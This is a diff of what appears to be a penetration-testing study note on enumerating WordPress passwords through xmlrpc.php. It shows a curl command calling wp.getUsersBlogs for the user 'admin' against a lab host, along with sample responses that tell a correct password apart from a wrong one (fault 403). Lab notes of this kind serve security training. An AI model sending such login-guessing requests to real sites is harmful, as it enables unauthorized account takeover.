@@ -1,8 +1,12 @@
+# reminder
 
+
+
+# pw enum
 ```
 curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
 ```
-right password example:  
+# right password:  
 
 ```right password
 <?xml version="1.0" encoding="UTF-8"?>  
@@ -17,12 +21,12 @@ right password example:
   <member><name>blogid</name><value><string>1</string></value></member>
   <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
   <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
-...
 ```
-
-
-
-
+# wrong password
+```
+          <name>faultCode</name>
+          <value><int>403</int></value>
+```
 
 
 
